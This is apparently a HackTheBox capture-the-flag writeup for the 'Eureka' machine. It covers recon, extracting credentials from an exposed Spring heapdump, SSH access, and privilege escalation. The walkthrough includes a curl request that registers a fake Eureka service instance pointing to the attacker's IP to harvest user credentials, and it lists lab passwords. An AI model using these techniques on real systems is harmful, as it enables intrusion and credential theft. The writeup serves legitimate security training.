---
title: 'HTB-Eureka'
published: 2025-07-15
draft: false
toc: true
tags: ['nuclei', 'JDumpSpider', 'EurekaServer', 'pspy']
---

---
```
Scope:
10.10.11.66
```

# Recon
## Nmap

```bash
sudo nmap -sV -sT -sC -p- -vvvv -T5 --min-rate=5000 eureka.htb

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://furni.htb/
8761/tcp open  http    syn-ack Apache Tomcat (language: en)
| http-auth: 
| HTTP/1.1 401 \x0D
|_  Basic realm=Realm
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Nuclei

![](attachments/323cef0a8614bb3d9d7b2de2899a9895.png)

I went ahead and ran `nuclei` in order to enumerate the vulnerabilities:

![](attachments/65dfa74df4c961ebd25bc72daecf5cdd.png)

```
http://furni.htb/actuator/heapdump
```

The above actuator jumps out as critical. The heap dump can expose credentials, tokens, secrets, and application internals.

## JDumpSpider

To extract the `heapdump` we can use the `jdumpspider`.

![](attachments/6b9b7db468a60eb638c0eeca98917849.png)

I head on over to the releases and download the most recent one:

![](attachments/b8d65b05df966d0073a0e461ff07a778.png)

I download the `heapdump`:

![](attachments/bb8d051ea74d90fc559f520520c110c0.png)

Now I run the script against the `heapdump` file:

```bash
java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
```

![](attachments/d5c9a4ca11c5a0884fbdf31c2dcb9198.png)

This gives us a set of creds:

```creds
oscar190
0sc@r190_S0l!dP@sswd
```

:::note
This also appears to be the `mysql` creds:
![](attachments/00379a4f43530a49b945d1024bafea6c.png)
:::

## 80/TCP - HTTP

![](attachments/6a196ca6fa683712adb506f12ad91395.png)

I use the found creds to log in:

![](attachments/7165e5f0d406063481703af2083f4309.png)

However this just gave me an error:

![](attachments/3f7ebb33b52d06e8e20e745f231b4f4f.png)

# Foothold
## Shell as oscar190

Turns out these creds are valid for `ssh`:

![](attachments/d7bf1fa29cdcb5554ab708f220cf3073.png)

I started enumerating the target.

![](attachments/7f206b1cb8bc9f665a938c8211e6fddb.png)

![](attachments/e2f75d287a479ee0681052e8916c3d08.png)

![](attachments/8d18963a7f5a78b475aa82a2f6f6a1cf.png)

![](attachments/c2ee1c49a236297e9f301fca041e2123.png)

## 8761/TCP - Eureka Server

So what now?

![](attachments/a2f4d3fb2e5664cc859928b598139032.png)

Turns out there's more interesting ports running on `localhost`.

And by using the `strings` command on the `heapdump` we can extract even another set of creds:

![](attachments/26fb30dfe473efc43bf718e9958e1eda.png)

```
EurekaSrvr
0scarPWDisTheB3st
```

Using these creds I can log into `8761`:

![](attachments/1be0dc13aafb2413cb15d6de910e2c97.png)

![](attachments/024e8a65cb0fddd1eedc48b765ccba16.png)

So... WTF is **Eureka Server**???

![](attachments/907e37aae7ff7249fa852c876ceba3c4.png)

![](attachments/82f15f6c7a28d0dbb3a9df6fe98772ef.png)

I started reading [this article](https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka).

![](attachments/bc575727d0085c7067a7eb1544f67161.png)

Scrolling further down:

![](attachments/cab548585e77042b18913568b491eefd.png)

![](attachments/fc2313eed7da216323065ef43bd9f81c.png)

We can essentially fake it by sending the following request and overwriting it:

```bash
curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@240.0.0.1:8761/eureka/apps/USER-MANAGEMENT-SERVICE  -H 'Content-Type: application/json' -d '{ 
  "instance": {
    "instanceId": "USER-MANAGEMENT-SERVICE",
    "hostName": "10.10.14.17",
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "10.10.14.17",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "status": "UP",
    "port": {   
      "$": 8081,
      "@enabled": "true"
    },
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    }
  }
}
'
```

:::important
But in order to communicate with the server we will first have to port forward in order to reach the `localhost`
:::

### Port Forward

![](attachments/9598bbdebb186d229688a05e7c246a25.png)

Accordingly I sent the above request:

![](attachments/a18dd35d2a38d2457d69271beda6394e.png)

```
miranda.wise
IL%21veT0Be%26BeT0L0ve&
```

## Lateral Movement

Got to tweak it around a little bit:

```
miranda-wise
IL!veT0Be&BeT0L0ve
```

![](attachments/c74e01b0c30d17b6f9c383b8f2fd5381.png)

### user.txt

![](attachments/54cd2f9acbfacbe518a2c3158dd5c57c.png)

So what's next?

![](attachments/f67b9245427ad6df57fe967d86dcf0c2.png)

Clearly this isn't the move here.


# Privilege Escalation
## pspy64

I ran `pspy64` and found the following:

![](attachments/fff29c4260b4d29f3f262dc36c903675.png)

And when we check whether we can write to that file we see this:

![](attachments/59aa7a78d6efce85ad05c673796b11df.png)

Turns out we're part of the **developers** group, which has access to this directory.

So I can do this:

![](attachments/d8fe61a2fd7402928d79ec506380cc46.png)

After waiting a while:

![](attachments/bb564080dd82a695bab7009f9fedd4c5.png)

I can now go ahead and escalate the shell:

![](attachments/49ce588157da759b7896086d88cc1814.png)

### root.txt

![](attachments/9c19756e2cd81fc17d9e18a787787bf2.png)

![](attachments/7df7af860471b4a2edf67ebd5e689112.png)

---